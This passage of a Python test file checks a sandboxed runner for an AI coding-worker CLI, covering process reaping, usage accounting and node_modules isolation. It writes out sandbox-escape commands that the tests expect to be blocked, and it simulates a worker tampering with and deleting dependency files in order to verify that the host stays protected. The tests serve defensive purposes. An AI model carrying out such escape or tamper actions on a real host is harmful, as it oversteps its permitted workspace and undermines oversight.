            f"cp -r {host_repo}/node_modules ./nm_copy",
            "ls -la ..",
        ):
            res_esc = json.loads(asyncio.run(by_name["run_command"](esc_cmd)))
            assert res_esc["status"] == "error", (esc_cmd, res_esc)
            assert res_esc["exit_code"] == 126, (esc_cmd, res_esc)

        allowed_tmp = json.loads(asyncio.run(by_name["run_command"]("ls -d /tmp")))
        assert allowed_tmp.get("status") != "error", allowed_tmp

        # 4. .tsbuildinfo is treated as an ephemeral build artifact
        assert _is_ephemeral_build_or_test_artifact("tsconfig.tsbuildinfo") is True


class TestGauntletRound2Bugs:
    """RED-first regression tests for all Gauntlet Round 2 findings across Opus, Fable, and Argon."""

    def test_setsid_grandchild_inheriting_pipes_does_not_hang_or_leak(self, tmp_path: Path):
        cfg_dir = tmp_path / "agy-cfg"
        cfg_dir.mkdir()
        (cfg_dir / "antigravity-oauth-token").write_text(json.dumps({"access_token": "tok"}), encoding="utf-8")
        pid_log = tmp_path / "grandchild_pids.txt"

        fake_agy = _write_executable(
            tmp_path / "bin" / "agy",
            f"""#!/usr/bin/env python3
import json, os, subprocess, sys
argv = sys.argv[1:]
if "--help" in argv:
    sys.stdout.write("Antigravity CLI\\n  --output-format string\\n")
    raise SystemExit(0)
_ = sys.stdin.read()
mode = os.environ.get("FAKE_GRANDCHILD_MODE", "result_then_exit")
p = subprocess.Popen(["sleep", "30"], start_new_session=True)
with open({str(pid_log)!r}, "a", encoding="utf-8") as fh:
    fh.write(f"{{p.pid}}\\n")
if mode == "result_then_exit":
    print(json.dumps({{
        "event": "result",
        "result": {{
            "status": "SUCCESS",
            "conversation_id": "conv-setsid",
            "num_turns": 1,
            "response": "all good",
            "usage": {{"input_tokens": 10, "output_tokens": 5}},
        }},
    }}), flush=True)
raise SystemExit(0)
""",
        )
        base_env = {
            "CC_AGY_CLI_BIN": str(fake_agy),
            "CC_AGY_CLI_CONFIG_DIR": str(cfg_dir),
            "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
        }

        # Case A: stream-json emits result, then setsid grandchild holds stdout/stderr open
        t0 = time.monotonic()
        out = run_agy_cli_worker(
            {
                "workspace_dir": str(tmp_path),
                "model": "gemini-3.8-flash",
                "prompt": "test setsid result",
                "timeout_seconds": 4.0,
                "env": {**base_env, "FAKE_GRANDCHILD_MODE": "result_then_exit"},
            }
        )
        assert (time.monotonic() - t0) < 2.5
        assert out["text"] == "all good"

        # Case B: stream-json leader exits without result while setsid grandchild holds stdout/stderr
        t1 = time.monotonic()
        with pytest.raises((TimeoutError, RuntimeError)):
            run_agy_cli_worker(
                {
                    "workspace_dir": str(tmp_path),
                    "model": "gemini-3.8-flash",
                    "prompt": "test setsid timeout",
                    "timeout_seconds": 0.8,
                    "env": {**base_env, "FAKE_GRANDCHILD_MODE": "exit_no_output"},
                }
            )
        assert (time.monotonic() - t1) < 2.5

        # Case C: json envelope (ask) leader exits without output while setsid grandchild holds stdout/stderr
        t2 = time.monotonic()
        with pytest.raises((TimeoutError, RuntimeError)):
            run_agy_cli_ask(
                {
                    "prompt": "test ask setsid timeout",
                    "timeout_seconds": 0.8,
                    "env": {**base_env, "FAKE_GRANDCHILD_MODE": "exit_no_output"},
                }
            )
        assert (time.monotonic() - t2) < 2.5

        # Verify all 3 detached setsid `sleep 30` grandchildren were reaped cleanly
        from server.agy_runner import _pid_is_alive_non_zombie

        spawned_pids = [int(x) for x in pid_log.read_text(encoding="utf-8").splitlines() if x.strip()]
        assert len(spawned_pids) == 3
        for gpid in spawned_pids:
            assert not _pid_is_alive_non_zombie(gpid), f"setsid grandchild {gpid} leaked!"

    def test_post_result_linger_persists_state_without_sigterm_143_failure(self, tmp_path: Path):
        cfg_dir = tmp_path / "agy-cfg"
        cfg_dir.mkdir()
        (cfg_dir / "antigravity-oauth-token").write_text(json.dumps({"access_token": "tok"}), encoding="utf-8")
        persist_log = tmp_path / "persist.log"

        fake_agy = _write_executable(
            tmp_path / "bin" / "agy",
            f"""#!/usr/bin/env python3
import json, os, signal, sys, time
argv = sys.argv[1:]
if "--help" in argv:
    sys.stdout.write("Antigravity CLI\\n  --output-format string\\n")
    raise SystemExit(0)
_ = sys.stdin.read()
def _on_term(_sig, _frm):
    with open({str(persist_log)!r}, "a", encoding="utf-8") as fh:
        fh.write("sigterm_before_persist\\n")
    raise SystemExit(143)
signal.signal(signal.SIGTERM, _on_term)
linger = float(os.environ.get("FAKE_LINGER_SEC", "2.0"))
print(json.dumps({{
    "event": "result",
    "result": {{
        "status": "SUCCESS",
        "conversation_id": "conv-linger",
        "num_turns": 1,
        "response": "persisted ok",
        "usage": {{"input_tokens": 12, "output_tokens": 4}},
    }},
}}), flush=True)
time.sleep(linger)
with open({str(persist_log)!r}, "a", encoding="utf-8") as fh:
    fh.write("persisted_cleanly\\n")
raise SystemExit(0)
""",
        )
        base_env = {
            "CC_AGY_CLI_BIN": str(fake_agy),
            "CC_AGY_CLI_CONFIG_DIR": str(cfg_dir),
            "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
        }

        # 2.0s post-result state flush completes cleanly without premature SIGTERM or code 143 error
        out = run_agy_cli_worker(
            {
                "workspace_dir": str(tmp_path),
                "model": "gemini-3.8-flash",
                "prompt": "flush test",
                "timeout_seconds": 15.0,
                "env": {**base_env, "FAKE_LINGER_SEC": "2.0"},
            }
        )
        assert out["text"] == "persisted ok"
        assert out["agy_conversation_id"] == "conv-linger"
        assert persist_log.read_text(encoding="utf-8").splitlines() == ["persisted_cleanly"]

        # Even if a process lingers past the post-result grace and gets SIGTERM during cleanup,
        # a completed SUCCESS result frame is still returned as ok rather than failing with exit 143.
        out_long = run_agy_cli_worker(
            {
                "workspace_dir": str(tmp_path),
                "model": "gemini-3.8-flash",
                "prompt": "long linger",
                "timeout_seconds": 3.0,
                "env": {**base_env, "FAKE_LINGER_SEC": "10.0"},
            }
        )
        assert out_long["text"] == "persisted ok"

    def test_json_envelope_empty_stdout_exit_zero_fails_and_no_pythonpath_shadowing(self, tmp_path: Path):
        cfg_dir = tmp_path / "agy-cfg"
        cfg_dir.mkdir()
        (cfg_dir / "antigravity-oauth-token").write_text(json.dumps({"access_token": "tok"}), encoding="utf-8")

        silent_agy = _write_executable(
            tmp_path / "bin" / "agy",
            """#!/usr/bin/env python3
import sys
if "--help" in sys.argv[1:]:
    sys.stdout.write("Antigravity CLI\\n  --output-format string\\n")
    raise SystemExit(0)
_ = sys.stdin.read()
raise SystemExit(0)
""",
        )
        env = {
            "CC_AGY_CLI_BIN": str(silent_agy),
            "CC_AGY_CLI_CONFIG_DIR": str(cfg_dir),
            "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
        }
        with pytest.raises(RuntimeError, match="without emitting"):
            run_agy_cli_ask({"prompt": "silent ask", "timeout_seconds": 3.0, "env": env})

        # Workspace with top-level calendar.py must not shadow Python stdlib in agy subprocess env
        ws = tmp_path / "py_ws"
        (ws / "sub").mkdir(parents=True)
        (ws / "calendar.py").write_text("raise SystemExit('shadowed stdlib calendar')\n", encoding="utf-8")
        built = build_agy_subprocess_env({"PATH": os.environ.get("PATH", "/usr/bin:/bin")}, workspace_dir=ws)
        assert "PYTHONPATH" not in built
        probe = subprocess.run(
            [sys.executable, "-c", "import calendar; print(calendar.MONDAY)"],
            cwd=str(ws / "sub"),
            env=built,
            capture_output=True,
            text=True,
            check=False,
        )
        assert probe.returncode == 0, probe.stderr
        assert probe.stdout.strip() == "0"

    def test_post_timeout_delegate_continue_preserves_cumulative_usage_baseline(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        repo = _init_git_repo(tmp_path / "repo")
        store = ReceiptStore(workspace_root=repo, data_dir=tmp_path / "data")

        cfg_dir = tmp_path / "agy-cfg"
        cfg_dir.mkdir()
        (cfg_dir / "antigravity-oauth-token").write_text(json.dumps({"access_token": "tok"}), encoding="utf-8")
        state_file = tmp_path / "turn_counter.txt"

        fake_agy = _write_executable(
            tmp_path / "bin" / "agy",
            f"""#!/usr/bin/env python3
import json, pathlib, sys, time
argv = sys.argv[1:]
if "--help" in argv:
    sys.stdout.write("Antigravity CLI\\n  --output-format string\\n")
    raise SystemExit(0)
_ = sys.stdin.read()
sf = pathlib.Path({str(state_file)!r})
turn_n = int(sf.read_text() if sf.exists() else "0") + 1
sf.write_text(str(turn_n))
conv = argv[argv.index("--conversation") + 1] if "--conversation" in argv else "conv-to-1"
if turn_n == 1:
    print(json.dumps({{
        "event": "result",
        "result": {{
            "status": "SUCCESS",
            "conversation_id": conv,
            "num_turns": 1,
            "response": "turn 1 done",
            "usage": {{"input_tokens": 1000, "output_tokens": 200}},
        }},
    }}), flush=True)
elif turn_n == 2:
    print(json.dumps({{
        "event": "step_update",
        "step_update": {{
            "conversation_id": conv,
            "step_index": 2,
            "usage": {{"input_tokens": 1500, "output_tokens": 300}},
        }},
    }}), flush=True)
    time.sleep(5.0)
else:
    print(json.dumps({{
        "event": "result",
        "result": {{
            "status": "SUCCESS",
            "conversation_id": conv,
            "num_turns": 3,
            "response": "turn 3 done",
            "usage": {{"input_tokens": 4000, "output_tokens": 1000}},
        }},
    }}), flush=True)
""",
        )
        monkeypatch.setenv("CC_AGY_CLI_BIN", str(fake_agy))
        monkeypatch.setenv("CC_AGY_CLI_CONFIG_DIR", str(cfg_dir))
        monkeypatch.setenv("CC_AGY_AUTH_MODE", "gemini_enterprise")

        jm = JobManager(workspace_root=repo, store=store)
        try:
            r1 = jm.delegate_start(prompt="Implement step 1 of app.py.", model="gemini-3.8-flash", wait=True)
            jid = r1["job_id"]
            assert r1["status"] == "ok"
            assert r1["usage"]["prompt_token_count"] == 1000

            r2 = jm.delegate_continue(
                job_id=jid,
                follow_up_prompt="Continue step 2.",
                timeout_seconds=0.6,
                wait=True,
            )
            assert r2["status"] == "timeout"
            assert r2["usage"]["prompt_token_count"] == 2500

            # Simulate cross-process resume by clearing in-memory ledger so receipt baseline is exercised too
            import server.agy_cli as agy_cli_mod

            with agy_cli_mod._CONV_LEDGER_LOCK:
                agy_cli_mod._CONVERSATION_USAGE_LEDGER.clear()

            r3 = jm.delegate_continue(
                job_id=jid,
                follow_up_prompt="Finish step 3.",
                timeout_seconds=5.0,
                wait=True,
            )
            assert r3["status"] == "ok"
            # Cumulative total across turns 1+2+3 must be 4000 prompt + 1000 candidates = 5000 (no double-count!)
            assert r3["usage"]["prompt_token_count"] == 4000, r3["usage"]
            assert r3["usage"]["candidates_token_count"] == 1000, r3["usage"]
            assert r3["usage"]["total_token_count"] == 5000, r3["usage"]
        finally:
            jm.shutdown(wait=True)

    def test_isolated_node_modules_protects_host_against_writes_and_rm_rf_and_supports_sparse_worktree(
        self, tmp_path: Path
    ):
        from server.jobs import link_host_node_modules_farm, unlink_host_node_modules_farm

        host = tmp_path / "host"
        wt = tmp_path / "sparse_wt"
        ext_store = tmp_path / "pnpm_ext" / "lodash"
        for p in (
            host / "node_modules" / "foo",
            host / "node_modules" / "@sc" / "bar",
            host / "node_modules" / "@multica",
            host / "packages" / "core",
            host / "packages" / "views",
            ext_store,
            wt / "packages" / "views",
        ):
            p.mkdir(parents=True, exist_ok=True)

        (host / "node_modules" / "foo" / "index.js").write_text("module.exports = 'orig';\n", encoding="utf-8")
        (host / "node_modules" / "@sc" / "bar" / "index.js").write_text("export const b = 1;\n", encoding="utf-8")
        (host / "node_modules" / ".package-lock.json").write_text("{}\n", encoding="utf-8")
        (ext_store / "index.js").write_text("module.exports = 'lodash';\n", encoding="utf-8")
        os.symlink(str(ext_store), str(host / "node_modules" / "lodash"))
        (host / "packages" / "core" / "index.d.ts").write_text("export const CORE = 1;\n", encoding="utf-8")
        os.symlink("../../packages/core", str(host / "node_modules" / "@multica" / "core"))

        created = link_host_node_modules_farm(host, wt)
        assert len(created) == 1
        wt_nm = wt / "node_modules"

        # 1. Sparse worktree: wt/packages/core is not checked out, yet @multica/core resolves and is readable!
        sparse_link = wt_nm / "@multica" / "core"
        assert sparse_link.is_symlink()
        assert sparse_link.exists()
        assert "CORE = 1" in (sparse_link / "index.d.ts").read_text(encoding="utf-8")

        # 2. External symlink preserves symlink semantics while isolating external store
        assert (wt_nm / "lodash").is_symlink()
        assert os.readlink(wt_nm / "lodash")
        assert not (wt_nm / ".package-lock.json").is_symlink()

        # 3. Opus N2 attack: overwrite wt/node_modules/foo/index.js and rm -rf wt/node_modules/@sc/bar/
        (wt_nm / "foo" / "index.js").write_text("module.exports = 'PATCHED BY WORKER';\n", encoding="utf-8")
        (wt_nm / "lodash" / "index.js").write_text("module.exports = 'TAMPERED';\n", encoding="utf-8")
        (sparse_link / "index.d.ts").write_text("TAMPERED CORE\n", encoding="utf-8")
        import shutil as _shutil

        _shutil.rmtree(wt_nm / "@sc" / "bar")

        # Host packages, external pnpm store, and host sibling package must all be 100% untouched!
        assert (host / "node_modules" / "foo" / "index.js").read_text(encoding="utf-8") == "module.exports = 'orig';\n"
        assert (host / "node_modules" / "@sc" / "bar" / "index.js").read_text(encoding="utf-8") == "export const b = 1;\n"
        assert (ext_store / "index.js").read_text(encoding="utf-8") == "module.exports = 'lodash';\n"
        assert (host / "packages" / "core" / "index.d.ts").read_text(encoding="utf-8") == "export const CORE = 1;\n"

        unlink_host_node_modules_farm(created)
        assert not wt_nm.exists()

    def test_oversized_shallow_nm_fallback_skips_cli_worker_and_flags_host_tamper(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        import server.jobs as jobs_mod

        host = tmp_path / "host_big"
        wt_cli = tmp_path / "wt_cli"
        wt_sdk = tmp_path / "wt_sdk"
        (host / "node_modules" / "pkg_a").mkdir(parents=True)
        (host / "node_modules" / "pkg_b").mkdir(parents=True)
        (host / "node_modules" / "pkg_a" / "index.js").write_text("a=1\n", encoding="utf-8")
        (host / "node_modules" / "pkg_b" / "index.js").write_text("b=2\n", encoding="utf-8")
        wt_cli.mkdir()
        wt_sdk.mkdir()

        # Force fallback to oversized non-CoW mode
        monkeypatch.setattr(jobs_mod, "_NM_COPY_MAX_FILES", 1)
        monkeypatch.setattr(jobs_mod, "_try_cow_clone_dir", lambda _src, _dst: False)

        # CLI worker (`allow_shallow_symlinks=False`) gets zero host-pointing symlinks
        cli_links = jobs_mod.link_host_node_modules_farm(host, wt_cli, allow_shallow_symlinks=False)
        assert cli_links == []
        assert not (wt_cli / "node_modules").exists()

        # SDK Straitjacket fallback (`allow_shallow_symlinks=True`) snapshots host metadata and catches tamper
        snap = jobs_mod._snapshot_host_nm_metadata(host)
        sdk_links = jobs_mod.link_host_node_modules_farm(host, wt_sdk, allow_shallow_symlinks=True)
        assert len(sdk_links) == 1
        assert jobs_mod._verify_host_nm_metadata_unchanged(host, snap) is True

        (host / "node_modules" / "pkg_a" / "index.js").write_text("tampered\n", encoding="utf-8")
        assert jobs_mod._verify_host_nm_metadata_unchanged(host, snap) is False
        jobs_mod.unlink_host_node_modules_farm(sdk_links)




